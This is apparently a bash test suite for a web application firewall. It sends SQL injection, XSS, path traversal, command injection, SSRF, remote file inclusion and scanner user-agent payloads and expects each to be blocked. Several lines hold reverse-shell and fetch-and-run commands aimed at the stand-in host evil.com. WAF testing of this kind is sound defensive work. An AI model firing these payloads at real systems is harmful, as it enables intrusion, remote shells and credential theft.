#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
#  GCS-WAF v2.0 — test-attacks.sh
#  Comprehensive attack test suite. Replaces the PowerShell version.
#  Usage: ./scripts/test-attacks.sh [WAF_URL]
# ─────────────────────────────────────────────────────────────────────────────

WAF_URL="${1:-http://localhost}"
PASS=0; FAIL=0; TOTAL=0

RED='\033[0;31m'; GREEN='\033[0;32m'; AMBER='\033[0;33m'
BLUE='\033[0;34m'; DIM='\033[2m'; NC='\033[0m'; BOLD='\033[1m'

header() { echo -e "\n${BOLD}${BLUE}── $1 ──────────────────────────────────────────${NC}"; }
pass()   { PASS=$((PASS+1));  TOTAL=$((TOTAL+1)); echo -e "  ${GREEN}[BLOCKED]${NC} $1"; }
fail()   { FAIL=$((FAIL+1));  TOTAL=$((TOTAL+1)); echo -e "  ${RED}[BYPASS] ${NC} $1 ← ${RED}WAF DID NOT BLOCK${NC}"; }
skip()   { echo -e "  ${DIM}[SKIP]   $1${NC}"; }

# Wrapper: expect 403
expect_block() {
    local label="$1"; local url="$2"; local extra="${3:-}"
    local code
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "User-Agent: TestSuite/2.0" \
        $extra "$url" 2>/dev/null)
    if [ "$code" = "403" ]; then pass "$label ($code)";
    else fail "$label (got $code)"; fi
}

# Wrapper: expect 200
expect_allow() {
    local label="$1"; local url="$2"
    local code
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "User-Agent: Mozilla/5.0 (Test)" "$url" 2>/dev/null)
    if [ "$code" = "200" ] || [ "$code" = "301" ] || [ "$code" = "302" ]; then
        pass "$label (allowed correctly)"
    else fail "$label (expected 200/30x, got $code)"; fi
}

echo -e "${BOLD}"
echo "  ╔══════════════════════════════════════════╗"
echo "  ║   GCS-WAF v2.0 — Attack Test Suite     ║"
echo "  ╚══════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "  Target: ${AMBER}${WAF_URL}${NC}"

# ── Health check ──────────────────────────────────────────────────────────────
header "Health Check"
code=$(curl -sk -o /dev/null -w "%{http_code}" "${WAF_URL}/health")
if [ "$code" = "200" ]; then
    echo -e "  ${GREEN}[OK]${NC} WAF is reachable (HTTP ${code})"
else
    echo -e "  ${RED}[FAIL]${NC} WAF not reachable (HTTP ${code})"
    echo "  Make sure GCS-WAF is running: docker-compose up -d"
    exit 1
fi

# ── SQL Injection ─────────────────────────────────────────────────────────────
header "SQL Injection"
expect_block "Classic OR 1=1"        "${WAF_URL}/?id=1'+OR+'1'='1"
expect_block "UNION SELECT"          "${WAF_URL}/?q=1+UNION+SELECT+null,username,password+FROM+users--"
expect_block "DROP TABLE"            "${WAF_URL}/?cmd=DROP+TABLE+users"
expect_block "xp_cmdshell"           "${WAF_URL}/?q=';+EXEC+xp_cmdshell('dir')--"
expect_block "SLEEP injection"       "${WAF_URL}/?id=1;+SLEEP(5)--"
expect_block "Stacked queries"       "${WAF_URL}/?id=1;+INSERT+INTO+admin+VALUES('hack','hack')"
expect_block "LOAD_FILE"             "${WAF_URL}/?f='+UNION+SELECT+LOAD_FILE('/etc/passwd')--"
expect_block "INTO OUTFILE"          "${WAF_URL}/?q=1+INTO+OUTFILE+'/tmp/shell.php'"

# ── Cross-Site Scripting ──────────────────────────────────────────────────────
header "XSS — Cross-Site Scripting"
expect_block "Script tag"            "${WAF_URL}/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
expect_block "IMG onerror"           "${WAF_URL}/?q=<img+src=x+onerror=alert(document.cookie)>"
expect_block "JavaScript: URI"       "${WAF_URL}/?url=javascript:alert(1)"
expect_block "SVG onload"            "${WAF_URL}/?q=<svg+onload=alert(1)>"
expect_block "iframe"                "${WAF_URL}/?q=<iframe+src=http://evil.com>"
expect_block "document.cookie"       "${WAF_URL}/?q=<script>document.cookie</script>"
expect_block "Expression() CSS"      "${WAF_URL}/?style=expression(alert(1))"

# ── Path Traversal ────────────────────────────────────────────────────────────
header "Path Traversal / LFI"
expect_block "Classic ../../../"     "${WAF_URL}/?file=../../../../etc/passwd"
expect_block "URL-encoded %2e%2e%2f" "${WAF_URL}/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
expect_block "etc/shadow"            "${WAF_URL}/?f=../../../etc/shadow"
expect_block "proc/self/environ"     "${WAF_URL}/?f=/proc/self/environ"
expect_block "Windows path"          "${WAF_URL}/?f=..\\..\\windows\\win.ini"
expect_block "/etc/hosts"            "${WAF_URL}/?page=/etc/hosts"

# ── Command Injection ─────────────────────────────────────────────────────────
header "Command Injection"
expect_block "Semicolon cat"         "${WAF_URL}/?cmd=hello;+cat+/etc/passwd"
expect_block "Pipe to bash"          "${WAF_URL}/?q=test|bash+-i+>%26+/dev/tcp/evil.com/4444"
expect_block "Backtick execution"    "${WAF_URL}/?q=\`id\`"
expect_block "Dollar subshell"       "${WAF_URL}/?q=\$(whoami)"
expect_block "Netcat reverse shell"  "${WAF_URL}/?cmd=nc+-e+/bin/bash+evil.com+4444"
expect_block "wget remote script"    "${WAF_URL}/?q=;+wget+http://evil.com/shell.sh+-O-+|+bash"

# ── SSRF ──────────────────────────────────────────────────────────────────────
header "SSRF — Server-Side Request Forgery"
expect_block "AWS metadata"          "${WAF_URL}/?url=http://169.254.169.254/latest/meta-data/"
expect_block "Localhost"             "${WAF_URL}/?url=http://localhost/admin"
expect_block "127.0.0.1"             "${WAF_URL}/?target=http://127.0.0.1:6379/"
expect_block "Internal 10.x"        "${WAF_URL}/?fetch=http://10.0.0.1/internal"
expect_block "file:// protocol"      "${WAF_URL}/?url=file:///etc/passwd"
expect_block "gopher://"             "${WAF_URL}/?url=gopher://127.0.0.1:25/"

# ── Remote File Inclusion ─────────────────────────────────────────────────────
header "RFI — Remote File Inclusion"
expect_block "PHP shell RFI"         "${WAF_URL}/?page=http://evil.com/shell.php"
expect_block "PHP wrapper"           "${WAF_URL}/?file=php://filter/convert.base64-encode/resource=index.php"
expect_block "Data URI"              "${WAF_URL}/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7"
expect_block "Phar wrapper"          "${WAF_URL}/?file=phar:///var/www/html/upload/test.jpg"

# ── Scanner Detection ─────────────────────────────────────────────────────────
header "Malicious Scanners / Bots"
expect_block "sqlmap UA" \
    "${WAF_URL}/?test=1" \
    "-H 'User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org)'"
expect_block "nikto UA" \
    "${WAF_URL}/" \
    "-H 'User-Agent: Nikto/2.1.6'"
expect_block "nmap UA" \
    "${WAF_URL}/" \
    "-H 'User-Agent: Nmap Scripting Engine'"

# ── False positive test (should NOT block) ────────────────────────────────────
header "False Positive Tests (these should be ALLOWED)"
expect_allow "Normal GET request"    "${WAF_URL}/?q=hello+world"
expect_allow "Health endpoint"       "${WAF_URL}/health"
expect_allow "Normal search query"   "${WAF_URL}/?search=buy+laptop+online"

# ── Results summary ───────────────────────────────────────────────────────────
echo ""
echo -e "${BOLD}─── Results ──────────────────────────────────────────────────${NC}"
echo -e "  Total tests:  ${TOTAL}"
echo -e "  ${GREEN}Passed:  ${PASS}${NC}"
echo -e "  ${RED}Failed:  ${FAIL}${NC}"
echo ""

if [ $FAIL -eq 0 ]; then
    echo -e "${GREEN}${BOLD}  ✓ All tests passed! Your WAF is working correctly.${NC}"
else
    echo -e "${RED}${BOLD}  ✗ ${FAIL} attack(s) bypassed the WAF. Review waf_core.lua rules.${NC}"
fi
echo ""
